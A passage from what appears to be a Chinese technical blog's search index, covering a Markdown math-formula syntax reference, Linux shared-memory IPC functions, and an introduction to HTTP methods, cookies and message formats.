<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">semun</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">semid_ds</span> *<span class="title">buf</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> *arry;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>一般用到的是val,表示要传给信号量的初始值。</p>
<p>semct函数成功返回大于或等于0，失败返回-1</p>
]]></content>
      <tags>
        <tag>Linux进程间通信</tag>
      </tags>
  </entry>
  <entry>
    <title>Markdown数学公式语法</title>
    <url>/2020/04/17/Markdown%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F%E8%AF%AD%E6%B3%95/</url>
    <content><![CDATA[<p>Markdown数学公式繁多，不容易记，此文大致总结一下，以供以后翻阅。<br><span id="more"></span></p>
<p>公式用法：</p>
<ol>
<li>行内公式：将公式插入到本行中，符号$公式内容$.</li>
<li>独行公式：将公式插入到新的一行内，并且居中，符号<script type="math/tex">公式内容</script>。</li>
</ol>
<p>以下Markdown格式不加$,加上表示相应公式。</p>
<h2 id="上标、下标与组合"><a href="#上标、下标与组合" class="headerlink" title="上标、下标与组合"></a>上标、下标与组合</h2><div class="table-container">
<table>
<thead>
<tr>
<th>类型</th>
<th>算式</th>
<th>Markdown</th>
</tr>
</thead>
<tbody>
<tr>
<td>上标</td>
<td>^</td>
<td>x^4</td>
</tr>
<tr>
<td>下标</td>
<td>$p_1$</td>
<td>p_1</td>
</tr>
<tr>
<td>组合</td>
<td>$e^{k-1}$</td>
<td>e^{k-1}</td>
</tr>
</tbody>
</table>
</div>
<h2 id="汉字、字体与格式"><a href="#汉字、字体与格式" class="headerlink" title="汉字、字体与格式"></a>汉字、字体与格式</h2><div class="table-container">
<table>
<thead>
<tr>
<th>类型</th>
<th>算式</th>
<th>Markdown</th>
</tr>
</thead>
<tbody>
<tr>
<td>汉字形式</td>
<td>$V_{\mbox{初始}}$</td>
<td>V_{\mbox{初始}}</td>
</tr>
<tr>
<td>字体控制</td>
<td>$\displaystyle\frac{x+y}{y+z}$</td>
<td>\displaystyle\frac{x+y}{y+z}</td>
</tr>
<tr>
<td>下划线符号</td>
<td>$\underline{x+y}$</td>
<td>\underline{x+y}</td>
</tr>
<tr>
<td>标签</td>
<td>$\tag{11}$</td>
<td>\tag{11}</td>
</tr>
<tr>
<td>上大括号</td>
<td>$\overbrace{a+b+c+d}^{2.0}$</td>
<td>\overbrace{a+b+c+d}^{2.0}</td>
</tr>
<tr>
<td>下大括号</td>
<td>$a+\underbrace{b+c}_{1.0}+d$</td>
<td>a+\underbrace{b+c}_{1.0}+d</td>
</tr>
<tr>
<td>上位符号</td>
<td>$\vec{x}\stackrel{\mathrm{def}}{=}{x_1,\dots,x_n}$</td>
<td>\vec{x}\stackrel{\mathrm{def}}{=}{x_1,\dots,x_n}</td>
</tr>
</tbody>
</table>
</div>
<h2 id="占位符"><a href="#占位符" class="headerlink" title="占位符"></a>占位符</h2><div class="table-container">
<table>
<thead>
<tr>
<th>类型</th>
<th>算式</th>
<th>Markdown</th>
</tr>
</thead>
<tbody>
<tr>
<td>两个quad空格</td>
<td>$x \qquad y$</td>
<td>x \qquad y</td>
</tr>
<tr>
<td>quad空格</td>
<td>$x \quad y$</td>
<td>x \quad y</td>
</tr>
<tr>
<td>大空格</td>
<td>$x \ y$</td>
<td>x \ y</td>
</tr>
<tr>
<td>中空格</td>
<td>$x \: y$</td>
<td>x \\: y</td>
</tr>
<tr>
<td>小空格</td>
<td>$x \, y$</td>
<td>x \\, y</td>
</tr>
<tr>
<td>没有空格</td>
<td>$xy$</td>
<td>xy</td>
</tr>
<tr>
<td>紧贴</td>
<td>$x!y$</td>
<td>x\!y</td>
</tr>
</tbody>
</table>
</div>
<h2 id="定界符和组合"><a href="#定界符和组合" class="headerlink" title="定界符和组合"></a>定界符和组合</h2><div class="table-container">
<table>
<thead>
<tr>
<th>类型</th>
<th>算式</th>
<th>Markdown</th>
</tr>
</thead>
<tbody>
<tr>
<td>括号</td>
<td>$（）\big(\big) \Big(\Big) \bigg(\bigg) \Bigg(\Bigg)$</td>
<td>（）\big(\big) \Big(\Big) \bigg(\bigg) \Bigg(\Bigg)</td>
</tr>
<tr>
<td>中括号</td>
<td>$[x+y]$</td>
<td>[x+y]</td>
</tr>
<tr>
<td>大括号</td>
<td>$\{x+y\}$</td>
<td>{x+y}</td>
</tr>
<tr>
<td>自适应括号</td>
<td>$\left(x\right)$，$\left(x{yz}\right)$</td>
<td>\left(x\right)$，$\left(x{yz}\right)</td>
</tr>
<tr>
<td>组合公式</td>
<td>${n+1 \choose k}={n \choose k}+{n \choose k-1}$</td>
<td>{n+1 \choose k}={n \choose k}+{n \choose k-1}</td>
</tr>
<tr>
<td>组合公式</td>
<td>$\sum_{k_0,k_1,\ldots&gt;0 \atop k_0+k_1+\cdots=n}A_{k_0}A_{k_1}\cdots$</td>
<td>\sum_{k_0,k_1,\ldots&gt;0 \atop k_0+k_1+\cdots=n}A_{k_0}A_{k_1}\cdots</td>
</tr>
</tbody>
</table>
</div>
<h2 id="四则运算"><a href="#四则运算" class="headerlink" title="四则运算"></a>四则运算</h2><div class="table-container">
<table>
<thead>
<tr>
<th>类型</th>
<th>算式</th>
<th>Markdown</th>
</tr>
</thead>
<tbody>
<tr>
<td>加法运算</td>
<td>$x+y=z$</td>
<td>x+y=z</td>
</tr>
<tr>
<td>减法运算</td>
<td>$x-y=z$</td>
<td>x-y=z</td>
</tr>
<tr>
<td>加减运算</td>
<td>$x \pm y=z$</td>
<td>x \pm y=z</td>
</tr>
<tr>
<td>减加运算</td>
<td>$x \mp y=z$</td>
<td>x \mp y=z</td>
</tr>
<tr>
<td>乘法运算</td>
<td>$x \times y=z$</td>
<td>x \times y=z</td>
</tr>
<tr>
<td>点乘运算</td>
<td>$x \cdot y=z$</td>
<td>x \cdot y=z</td>
</tr>
<tr>
<td>星乘运算</td>
<td>$x \ast y=z$</td>
<td>x \ast y=z</td>
</tr>
<tr>
<td>除法运算</td>
<td>$x \div y=z$</td>
<td>x \div y=z</td>
</tr>
<tr>
<td>斜除法运算</td>
<td>$x/y=z$</td>
<td>x/y=z</td>
</tr>
<tr>
<td>分式表示</td>
<td>$\frac{x+y}{y+z}$</td>
<td>\frac{x+y}{y+z}</td>
</tr>
<tr>
<td>分式表示</td>
<td>${x+y} \over {y+z}$</td>
<td>{x+y} \over {y+z}</td>
</tr>
</tbody>
</table>
</div>
<h2 id="高级运算"><a href="#高级运算" class="headerlink" title="高级运算"></a>高级运算</h2><div class="table-container">
<table>
<thead>
<tr>
<th>类型</th>
<th>算式</th>
<th>Markdown</th>
</tr>
</thead>
<tbody>
<tr>
<td>平均数运算</td>
<td>$\overline{xyz}$</td>
<td>\overline{xyz}</td>
</tr>
<tr>
<td>开二次方运算</td>
<td>$\sqrt x$</td>
<td>\sqrt x</td>
</tr>
<tr>
<td>开方运算</td>
<td>$\sqrt[3]{x+y}$</td>
<td>\sqrt[3]{x+y}</td>
</tr>
<tr>
<td>对数运算</td>
<td>$\log(x)$</td>
<td>\log(x)</td>
</tr>
<tr>
<td>极限运算</td>
<td>$\lim^{x \to \infty}_{y \to 0}{\frac{x}{y}}$</td>
<td>\lim^{x \to \infty}_{y \to 0}{\frac{x}{y}}</td>
</tr>
<tr>
<td>极限运算</td>
<td>$\displaystyle \lim^{x \to \infty}_{y \to 0}{\frac{x}{y}}$</td>
<td>\displaystyle \lim^{x \to \infty}_{y \to 0}{\frac{x}{y}}</td>
</tr>
<tr>
<td>求和运算</td>
<td>$\sum^{x \to \infty}_{y \to 0}{\frac{x}{y}}$</td>
<td>\sum^{x \to \infty}_{y \to 0}{\frac{x}{y}}</td>
</tr>
<tr>
<td>求和运算</td>
<td>$\displaystyle \sum^{x \to \infty}_{y \to 0}{\frac{x}{y}}$</td>
<td>\displaystyle \sum^{x \to \infty}_{y \to 0}{\frac{x}{y}}</td>
</tr>
<tr>
<td>积分运算</td>
<td>$\int^{\infty}_{0}{xdx}$</td>
<td>\int^{\infty}_{0}{xdx}</td>
</tr>
<tr>
<td>积分运算</td>
<td>$\displaystyle \int^{\infty}_{0}{xdx}$</td>
<td>\displaystyle \int^{\infty}_{0}{xdx}</td>
</tr>
<tr>
<td>微分运算</td>
<td>$\frac{\partial x}{\partial y}$</td>
<td>\frac{\partial x}{\partial y}</td>
</tr>
<tr>
<td>矩阵表示</td>
<td>$\left[\begin{matrix}a &amp; b &amp; c &amp; d &amp; e\\f &amp; g &amp; h &amp; i &amp; j \\k &amp; l &amp; m &amp; n &amp; o \\p &amp; q &amp; r &amp; s &amp; t\end{matrix} \right]$</td>
<td>\left[\begin{matrix}a &amp; b &amp; c &amp; d &amp; e\\f &amp; g &amp; h &amp; i &amp; j \\k &amp; l &amp; m &amp; n &amp; o \\p &amp; q &amp; r &amp; s &amp; t\end{matrix} \right]</td>
</tr>
</tbody>
</table>
</div>
<h2 id="逻辑运算"><a href="#逻辑运算" class="headerlink" title="逻辑运算"></a>逻辑运算</h2><div class="table-container">
<table>
<thead>
<tr>
<th>类型</th>
<th>算式</th>
<th>Markdown</th>
</tr>
</thead>
<tbody>
<tr>
<td>等于运算</td>
<td>$x+y=z$</td>
<td>x+y=z</td>
</tr>
<tr>
<td>大于运算</td>
<td>$x+y&gt;z$</td>
<td>x+y&gt;z</td>
</tr>
<tr>
<td>小于运算</td>
<td>$x+y&lt;z$</td>
<td>x+y&lt;z</td>
</tr>
<tr>
<td>大于等于运算</td>
<td>$x+y \geq z$</td>
<td>x+y \geq z</td>
</tr>
<tr>
<td>小于等于运算</td>
<td>$x+y \leq z$</td>
<td>x+y \leq z</td>
</tr>
<tr>
<td>不等于运算</td>
<td>$x+y \neq z$</td>
<td>x+y \neq z</td>
</tr>
<tr>
<td>不大于等于运算</td>
<td>$x+y \ngeq z$</td>
<td>x+y \ngeq z</td>
</tr>
<tr>
<td>不大于等于运算</td>
<td>$x+y \not\geq z$</td>
<td>x+y \not\geq z</td>
</tr>
<tr>
<td>不小于等于运算</td>
<td>$x+y \not\geq z$</td>
<td>x+y \not\geq z</td>
</tr>
<tr>
<td>不小于等于运算</td>
<td>$x+y \nleq z$</td>
<td>x+y \nleq z</td>
</tr>
<tr>
<td>约等于运算</td>
<td>$x+y \approx z$</td>
<td>x+y \approx z</td>
</tr>
<tr>
<td>恒等于运算</td>
<td>$x+y \equiv z$</td>
<td>x+y \equiv z</td>
</tr>
</tbody>
</table>
</div>
<h2 id="集合运算"><a href="#集合运算" class="headerlink" title="集合运算"></a>集合运算</h2><div class="table-container">
<table>
<thead>
<tr>
<th>类型</th>
<th>算式</th>
<th>Markdown</th>
</tr>
</thead>
<tbody>
<tr>
<td>属于运算</td>
<td>$x \in y$</td>
<td>x \in y</td>
</tr>
<tr>
<td>不属于运算</td>
<td>$x \notin y$</td>
<td>x \notin y</td>
</tr>
<tr>
<td>子集运算</td>
<td>$x \subset y$</td>
<td>x \subset y</td>
</tr>
<tr>
<td>子集运算</td>
<td>$x \supset y$</td>
<td>x \supset y</td>
</tr>
<tr>
<td>真子集运算</td>
<td>$x \subseteq y$</td>
<td>x \subseteq y</td>
</tr>
<tr>
<td>非真子集运算</td>
<td>$x \subsetneq y$</td>
<td>x \subsetneq y</td>
</tr>
<tr>
<td>真子集运算</td>
<td>$x \supseteq y$</td>
<td>x \supseteq y</td>
</tr>
<tr>
<td>非真子集运算</td>
<td>$x \supsetneq y$</td>
<td>x \supsetneq y</td>
</tr>
<tr>
<td>非子集运算</td>
<td>$x \not\subset y$</td>
<td>x \not\subset y</td>
</tr>
<tr>
<td>非子集运算</td>
<td>$x \not\supset y$</td>
<td>x \not\supset y</td>
</tr>
<tr>
<td>并集运算</td>
<td>$x \cup y$</td>
<td>x \cup y</td>
</tr>
<tr>
<td>交集运算</td>
<td>$x \cap y$</td>
<td>x \cap y</td>
</tr>
<tr>
<td>差集运算</td>
<td>$x \setminus y$</td>
<td>x \setminus y</td>
</tr>
<tr>
<td>同或运算</td>
<td>$x \bigodot y$</td>
<td>x \bigodot y</td>
</tr>
<tr>
<td>同与运算</td>
<td>$x \bigotimes y$</td>
<td>x \bigotimes y</td>
</tr>
<tr>
<td>实数集合</td>
<td>$\mathbb{R}$</td>
<td>\mathbb{R}</td>
</tr>
<tr>
<td>自然数集合</td>
<td>$\mathbb{Z}$</td>
<td>\mathbb{Z}</td>
</tr>
<tr>
<td>空集</td>
<td>$\emptyset$</td>
<td>\emptyset</td>
</tr>
</tbody>
</table>
</div>
<h2 id="数学符号"><a href="#数学符号" class="headerlink" title="数学符号"></a>数学符号</h2><div class="table-container">
<table>
<thead>
<tr>
<th>类型</th>
<th>算式</th>
<th>Markdown</th>
</tr>
</thead>
<tbody>
<tr>
<td>无穷</td>
<td>$\infty$</td>
<td>\infty</td>
</tr>
<tr>
<td>虚数</td>
<td>$\imath$</td>
<td>\imath</td>
</tr>
<tr>
<td>虚数</td>
<td>$\jmath$</td>
<td>\jmath</td>
</tr>
<tr>
<td>数学符号</td>
<td>$\hat{a}$</td>
<td>\hat{a}</td>
</tr>
<tr>
<td>数学符号</td>
<td>$\check{a}$</td>
<td>\check{a}</td>
</tr>
<tr>
<td>数学符号</td>
<td>$\breve{a}$</td>
<td>\breve{a}</td>
</tr>
<tr>
<td>数学符号</td>
<td>$\tilde{a}$</td>
<td>\tilde{a}</td>
</tr>
<tr>
<td>数学符号</td>
<td>$\bar{a}$</td>
<td>\bar{a}</td>
</tr>
<tr>
<td>矢量符号</td>
<td>$\vec{a}$</td>
<td>\vec{a}</td>
</tr>
<tr>
<td>数学符号</td>
<td>$\acute{a}$</td>
<td>\acute{a}</td>
</tr>
<tr>
<td>数学符号</td>
<td>$\grave{a}$</td>
<td>\grave{a}</td>
</tr>
<tr>
<td>数学符号</td>
<td>$\mathring{a}$</td>
<td>\mathring{a}</td>
</tr>
<tr>
<td>一阶导数符号</td>
<td>$\dot{a}$</td>
<td>\dot{a}</td>
</tr>
<tr>
<td>二阶导数符号</td>
<td>$\ddot{a}$</td>
<td>\ddot{a}</td>
</tr>
<tr>
<td>上箭头</td>
<td>$\uparrow$/$\Uparrow$</td>
<td>\uparrow / \Uparrow</td>
</tr>
<tr>
<td>下箭头</td>
<td>$\downarrow$ / $\Downarrow$</td>
<td>\downarrow / \Downarrow</td>
</tr>
<tr>
<td>左箭头</td>
<td>$\leftarrow$ / $\Leftarrow$</td>
<td>\leftarrow / \Leftarrow</td>
</tr>
<tr>
<td>右箭头</td>
<td>$\rightarrow$ / $\Rightarrow$</td>
<td>\rightarrow / \Rightarrow</td>
</tr>
<tr>
<td>低端对齐省略号</td>
<td>$1,2,\ldots,n$</td>
<td>1,2,\ldots,n</td>
</tr>
<tr>
<td>中线对齐省略号</td>
<td>$x_1^2 + x_2^2 + \cdots + x_n^2$</td>
<td>x_1^2 + x_2^2 + \cdots + x_n^2</td>
</tr>
<tr>
<td>竖直对齐省略号</td>
<td>$\vdots$</td>
<td>\vdots</td>
</tr>
<tr>
<td>斜对齐省略号</td>
<td>$\ddots$</td>
<td>\ddots</td>
</tr>
</tbody>
</table>
</div>
<h2 id="希腊字母"><a href="#希腊字母" class="headerlink" title="希腊字母"></a>希腊字母</h2><div class="table-container">
<table>
<thead>
<tr>
<th>字母</th>
<th>实现</th>
<th>字母</th>
<th>实现</th>
</tr>
</thead>
<tbody>
<tr>
<td>$A$</td>
<td>A</td>
<td>$\alpha$</td>
<td>\alpha</td>
</tr>
<tr>
<td>$B$</td>
<td>B</td>
<td>$\beta$</td>
<td>\beta</td>
</tr>
<tr>
<td>$\Gamma$</td>
<td>\Gamma</td>
<td>$\gamma$</td>
<td>\gamma</td>
</tr>
<tr>
<td>$\Delta$</td>
<td>\Delta</td>
<td>$\delta$</td>
<td>\delta</td>
</tr>
<tr>
<td>$E$</td>
<td>E</td>
<td>$\epsilon$</td>
<td>\epsilon</td>
</tr>
<tr>
<td>$Z$</td>
<td>Z</td>
<td>$\zeta$</td>
<td>\zeta</td>
</tr>
<tr>
<td>$H$</td>
<td>H</td>
<td>$\eta$</td>
<td>\eta</td>
</tr>
<tr>
<td>$\Theta$</td>
<td>\Theta</td>
<td>$\theta$</td>
<td>\theta</td>
</tr>
<tr>
<td>$I$</td>
<td>I</td>
<td>$\iota$</td>
<td>\iota</td>
</tr>
<tr>
<td>$K$</td>
<td>K</td>
<td>$\kappa$</td>
<td>\kappa</td>
</tr>
<tr>
<td>$\Lambda$</td>
<td>\Lambda</td>
<td>$\lambda$</td>
<td>\lambda</td>
</tr>
<tr>
<td>$M$</td>
<td>M</td>
<td>$\mu$</td>
<td>\mu</td>
</tr>
<tr>
<td>$N$</td>
<td>N</td>
<td>$\nu$</td>
<td>\nu</td>
</tr>
<tr>
<td>$\Xi$</td>
<td>\Xi</td>
<td>$\xi$</td>
<td>\xi</td>
</tr>
<tr>
<td>$O$</td>
<td>O</td>
<td>$\omicron$</td>
<td>\omicron</td>
</tr>
<tr>
<td>$\Pi$</td>
<td>\Pi</td>
<td>$\pi$</td>
<td>\pi</td>
</tr>
<tr>
<td>$P$</td>
<td>P</td>
<td>$\rho$</td>
<td>\rho</td>
</tr>
<tr>
<td>$\Sigma$</td>
<td>\Sigma</td>
<td>$\sigma$</td>
<td>\sigma</td>
</tr>
<tr>
<td>$T$</td>
<td>T</td>
<td>$\tau$</td>
<td>\tau</td>
</tr>
<tr>
<td>$\Upsilon$</td>
<td>\Upsilon</td>
<td>$\upsilon$</td>
<td>\upsilon</td>
</tr>
<tr>
<td>$\Phi$</td>
<td>\Phi</td>
<td>$\phi$</td>
<td>\phi</td>
</tr>
<tr>
<td>$X$</td>
<td>X</td>
<td>$\chi$</td>
<td>\chi</td>
</tr>
<tr>
<td>$\Psi$</td>
<td>\Psi</td>
<td>$\psi$</td>
<td>\psi</td>
</tr>
<tr>
<td>$\Omega$</td>
<td>\Omega</td>
<td>$\omega$</td>
<td>\omega</td>
</tr>
</tbody>
</table>
</div>
]]></content>
  </entry>
  <entry>
    <title>Linux进程间通信——共享内存</title>
    <url>/2020/10/29/Linux%E8%BF%9B%E7%A8%8B%E9%97%B4%E9%80%9A%E4%BF%A1%E2%80%94%E2%80%94%E5%85%B1%E4%BA%AB%E5%86%85%E5%AD%98/</url>
    <content><![CDATA[<h2 id="Linux进程间通信——共享内存"><a href="#Linux进程间通信——共享内存" class="headerlink" title="Linux进程间通信——共享内存"></a>Linux进程间通信——共享内存</h2><h3 id="共享内存简介"><a href="#共享内存简介" class="headerlink" title="共享内存简介"></a>共享内存简介</h3><h4 id="什么是共享内存"><a href="#什么是共享内存" class="headerlink" title="什么是共享内存"></a>什么是共享内存</h4><p>共享内存就是允许两个不相关的进程访问同一个逻辑内存。共享内存是在两个正在运行的进程之间共享和传递数据的一种非常有效的方式。不同进程之间共享的内存通常安排为同一段物理内存。进程可以将同一段共享内存连接到它们自己的地址空间中，所有进程都可以访问共享内存中的地址，就好像它们是由用C语言函数malloc()分配的内存一样。而如果某个进程向共享内存写入数据，所做的改动将立即影响到可以访问同一段共享内存的任何其他进程。<br><span id="more"></span><br>特别提醒：共享内存并未提供同步机制，也就是说，在第一个进程结束对共享内存的写操作之前，并无自动机制可以阻止第二个进程开始对它进行读取。所以我们通常需要用其他的机制来同步对共享内存的访问，例如信号量。</p>
<h3 id="共享内存使用"><a href="#共享内存使用" class="headerlink" title="共享内存使用"></a>共享内存使用</h3><p>使用共享内存进行进程通信时需要用到四个函数：shmget(),shmat(),shmdt(),shmctl()。这四个函数的使用需要声明sys/shm.h头文件</p>
<h4 id="shmget函数"><a href="#shmget函数" class="headerlink" title="shmget函数"></a>shmget函数</h4><p>该函数用来创建共享内存，函数原型：</p>
<blockquote>
<p>int shmget(key_t key,size_t size,int shmflg);</p>
</blockquote>
<p>shmget()用来获得共享内存区域的ID（如果不存在该共享内存区域则创建一个新的共享内存区域）</p>
<p>参数解释：<br><strong>key_t key：</strong> 共享内存标识符，两个不相关的进程之间我们可以自定义一个key来使用，若为父子进程的话，该标识符可为IPC_PRIVATE（需要在父子进程都可见的地方调用（即在创建子进程之前），否则不能实现内存的共享）。<br><strong>size：</strong> 以字节为单位指定需要共享的内存容量<br><strong>shmflg:</strong> 权限标志，它的作用与open函数的mode参数一样，如果要想在key标识的共享内存不存在时创建它的话，可以与IPC_CREAT做或操作。共享内存的权限标志与文件的读写权限一样，举例来说，0644,它表示允许一个进程创建的共享内存被内存创建者所拥有的进程向共享内存读取和写入数据，同时其他用户创建的进程只能读取共享内存。</p>
<p>IPC_CREAT   如果共享内存不存在，则创建一个共享内存，否则打开操作。<br>IPC_EXCL    只有在共享内存不存在的时候，新的共享内存才建立，否则就产生错误。</p>
<p>调用成功返回共享内存的标识符，失败返回-1</p>
<h4 id="shmat函数"><a href="#shmat函数" class="headerlink" title="shmat函数"></a>shmat函数</h4><p>第一次创建完共享内存时，它还不能被任何进程访问，shmat函数的作用就是用来启动对该共享内存的访问，并把共享内存连接到当前进程的地址空间。它的原型如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">shmat</span><span class="params">(<span class="keyword">int</span> shm_id,<span class="keyword">const</span> <span class="keyword">void</span> *shm_addr,<span class="keyword">int</span> shmflg)</span></span>;</span><br></pre></td></tr></table></figure>
<p><strong>shm_id:</strong> 共享内存标识。<br><strong>shm_addr:</strong> 指定共享内存连接到当前进程中的地址位置，通常为空，表示让系统来选择共享内存的地址。<br><strong>shm_flg:</strong> 一组标志位，通常为0。</p>
<p>调用成功时返回一个指向共享内存第一个字节的指针，如果调用失败返回-1.</p>
<h4 id="shmdt函数"><a href="#shmdt函数" class="headerlink" title="shmdt函数"></a>shmdt函数</h4><p>该函数用于将共享内存从当前进程中分离。注意，将共享内存分离并不是删除它，只是使该共享内存对当前进程不再可用。它的原型如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">shmctl</span><span class="params">(<span class="keyword">int</span> shm_id, <span class="keyword">int</span> command, struct shmid_ds *buf)</span></span>;</span><br></pre></td></tr></table></figure>
<p><strong>shmaddr</strong> shmatt函数返回的地址指针</p>
<p>调用成功时返回0，失败时返回-1.</p>
<h4 id="shmctl函数"><a href="#shmctl函数" class="headerlink" title="shmctl函数"></a>shmctl函数</h4><p>与信号量的semctl函数一样，用来控制共享内存，它的原型如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">shmctl</span><span class="params">(<span class="keyword">int</span> shm_id, <span class="keyword">int</span> command, struct shmid_ds *buf)</span></span>;</span><br></pre></td></tr></table></figure>
<p><strong>shm_id:</strong> shmget返回共享内存标识符<br><strong>command：</strong> 要采取的操作，可以取下面三个值：</p>
<ul>
<li>IPC_STAT：把shmid_ds结构中的数据设置为共享内存的当前关联值，即用共享内存的当前关联值覆盖shmid_ds的值。</li>
<li>IPC_SET：如果进程有足够的权限，就把共享内存的当前关联值设置为shmid_ds结构中给出的值</li>
<li>IPC_RMID：删除共享内存段</li>
</ul>
<p><strong>buf：</strong> 一个结构指针，指向共享内存模式和访问权限的结构<br>shmid_ds结构至少包括以下成员：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">shmid_ds</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">uid_t</span> shm_perm.uid;</span><br><span class="line">    <span class="keyword">uid_t</span> shm_perm.git;</span><br><span class="line">    <span class="keyword">mode_t</span> shm_perm.mode;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="使用共享内存的优缺点"><a href="#使用共享内存的优缺点" class="headerlink" title="使用共享内存的优缺点"></a>使用共享内存的优缺点</h3><h4 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h4><p>使用共享内存进行进程间的通信非常方便，而且函数的接口也简单，数据的共享还使进程间的数据不用传送，而是直接访问内存，也加快了程序的效率。同时，它也不像匿名管道那样要求通信的进程有一定的父子关系。</p>
<h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><p>共享内存没有提供同步的机制，这使得我们在使用共享内存进行进程间通信时，往往要借助其他的手段来进行进程间的同步工作。</p>
]]></content>
      <tags>
        <tag>Linux进程间通信</tag>
      </tags>
  </entry>
  <entry>
    <title>HTTP协议</title>
    <url>/2020/02/12/HTTP%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<h3 id="简单介绍了HTTP协议"><a href="#简单介绍了HTTP协议" class="headerlink" title="简单介绍了HTTP协议"></a>简单介绍了HTTP协议</h3><span id="more"></span>
<h2 id="1-环境"><a href="#1-环境" class="headerlink" title="1.环境"></a>1.环境</h2><h2 id="2-了解WEB"><a href="#2-了解WEB" class="headerlink" title="2.了解WEB"></a>2.了解WEB</h2><p>Web使用一种名为HTTP（HyperText Transfer Protocol，超文本运输协议）的协议作为规范，完成从客户端到服务器端等一系列运作流程。Web是建立在HTTP（TCP/80)协议上通信的。<br>WWW（万维网）这一名称，是Web浏览器当年用来浏览超文本的客户端应用程序时的名称。现在表示这一系列的集合，简称Web</p>
<ul>
<li>页面的文本标记语言<strong>HTML</strong>（HyperText Markup Language,超文本标记语言）</li>
<li>作为文档传递协议的<strong>HTTP</strong></li>
<li>指定文档所在地址的<strong>URL</strong>（Uniform Resource Locator,统一资源定位符）</li>
<li><strong>URI</strong>（Uniform Resource Identifier,统一资源标识符）<br>URI用字符标识某一互联网资源，URL表示资源的地点（互联网上所处的位置）<br><strong>URL是一种具体的URI</strong><br>HTTP/1.1是目前主流的HTTP协议版本</li>
</ul>
<h2 id="3-HTTP协议简介"><a href="#3-HTTP协议简介" class="headerlink" title="3.HTTP协议简介"></a>3.HTTP协议简介</h2><p>客户端和服务器<br><img src="/2020/02/12/HTTP%E5%8D%8F%E8%AE%AE/客户端-服务器.png" alt="图片"><br>HTTP是不保存状态的协议，目的是为了更快的处理大量事务。不能进行事务的关联。<br>隐含参数和Cookie技术，能协助HTTP解决无状态问题</p>
<h3 id="HTTP-Method-GET"><a href="#HTTP-Method-GET" class="headerlink" title="HTTP Method GET"></a>HTTP Method GET</h3><p>GET：获取资源 </p>
<p>通过URL传<br>请求访问已被URI识别的资源。指定的资源经服务器端解析后返回相应内容。</p>
<p>如果请求的资源是文本，保持原样返回；如果是像CGI（Common Gateway Interface,通用网关借口)那样的程序，返回经过执行后的输出结果。</p>
<h3 id="HTTP-Method-POST"><a href="#HTTP-Method-POST" class="headerlink" title="HTTP Method POST"></a>HTTP Method POST</h3><p>POST：传输实体主体</p>
<p>以下用POST</p>
<ul>
<li>请求中包含数据更新等副作用时</li>
<li>发送敏感信息时（防止Referer安全隐患）</li>
<li>发送的信息量很多时（URL长度有限）</li>
</ul>
<p>副作用：指除了获取资源（内容）以外的其他操作。比如，追加/更新/删除服务器端的数据、购买商品、注册/删除用户等操作。</p>
<h3 id="HTTP-Method-PUT"><a href="#HTTP-Method-PUT" class="headerlink" title="HTTP Method PUT"></a>HTTP Method PUT</h3><p>PUT：传输文件 </p>
<p>存在安全隐患一般文件上传采用POST</p>
<h3 id="HTTP-Method-HEAD"><a href="#HTTP-Method-HEAD" class="headerlink" title="HTTP Method HEAD"></a>HTTP Method HEAD</h3><p>HEAD：获得报文首部</p>
<p>与GET方法一样，只是不返回报文主体部分，用于确认URI的有效性及资源更新的日期时间等。</p>
<h3 id="HTTP-Method-DELETE"><a href="#HTTP-Method-DELETE" class="headerlink" title="HTTP Method DELETE"></a>HTTP Method DELETE</h3><p>用来删除文件，是与PUT相反的的方法。DELETE方法按请求URI删除指定的资源<br><img src="/2020/02/12/HTTP%E5%8D%8F%E8%AE%AE/HTTP支持的方法.png" alt="图片"></p>
<h3 id="Cookie的工作原理"><a href="#Cookie的工作原理" class="headerlink" title="Cookie的工作原理"></a>Cookie的工作原理</h3><p><img src="/2020/02/12/HTTP%E5%8D%8F%E8%AE%AE/没有Cookie信息下请求.png" alt><br><img src="/2020/02/12/HTTP%E5%8D%8F%E8%AE%AE/存有Cookie信息下请求.png" alt></p>
<h2 id="4-HTTP报文"><a href="#4-HTTP报文" class="headerlink" title="4.HTTP报文"></a>4.HTTP报文</h2><p>请求端的HTTP报文叫请求报文，响应端的HTTP报文叫响应报文。</p>
<h4 id="请求报文："><a href="#请求报文：" class="headerlink" title="请求报文："></a>请求报文：</h4><ul>
<li>报文首部：<ul>
<li>请求行</li>
<li>请求首部字段</li>
<li>通用首部字段</li>
<li>实体首部字段</li>
<li>其他</li>
</ul>
</li>
<li>空行：</li>
<li>报文主体<br><img src="/2020/02/12/HTTP%E5%8D%8F%E8%AE%AE/请求报文格式.png" alt="图片"></li>
</ul>
<h4 id="响应报文："><a href="#响应报文：" class="headerlink" title="响应报文："></a>响应报文：</h4><ul>
<li>报文首部：<ul>
<li>状态行</li>
<li>响应首部字段</li>
<li>通用首部字段</li>
<li>实体首部字段</li>
<li>其他</li>
</ul>
</li>
<li>空行</li>
<li>报文主体<br><img src="/2020/02/12/HTTP%E5%8D%8F%E8%AE%AE/响应报文格式.png" alt="图片"></li>
</ul>
<h2 id="5-HTTP状态码"><a href="#5-HTTP状态码" class="headerlink" title="5.HTTP状态码"></a>5.HTTP状态码</h2><p>【功能】：当客户端向服务器发送请求时，描述返回的请求结果。</p>
<div class="table-container">
<table>
<thead>
<tr>
<th></th>
<th>类别</th>
<th>原因短语</th>
</tr>
</thead>
<tbody>
<tr>
<td>1XX</td>
